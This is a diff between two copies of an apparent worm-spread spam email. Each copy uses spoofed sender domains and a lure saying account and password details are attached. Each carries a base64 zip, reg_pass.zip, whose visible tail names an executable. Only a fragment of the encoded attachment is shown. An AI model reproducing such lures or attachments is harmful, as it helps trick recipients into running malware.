@@ -1,26 +1,26 @@
-From: office@emness.com
+From: hostmaster@sohu.com
 Subject: Registration Confirmation
-Date: Sat, 24 Dec 2005 22:37:03 UTC
-Message-ID: <c6ad65.6469f1fb96@emness.com>
+Date: Sat, 24 Dec 2005 23:43:18 UTC
+Message-ID: <eeb97ad8adad7e6e14@sohu.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="======72ce692.335a2556337c"
+Content-Type: multipart/mixed; boundary="=a674fcc6322eb"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: MailIn_Box@oss.sgi.com
+To: majordomo@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---======72ce692.335a2556337c
+--=a674fcc6322eb
 
 Account and Password Information are attached!
 
 
-***** Go to: http://www.emness.com
-***** Email: postman@emness.com
---======72ce692.335a2556337c
+***** Go to: http://www.sohu.com
+***** Email: postman@sohu.com
+--=a674fcc6322eb
 Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="reg_pass.zip"
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---======72ce692.335a2556337c--
+--=a674fcc6322eb--
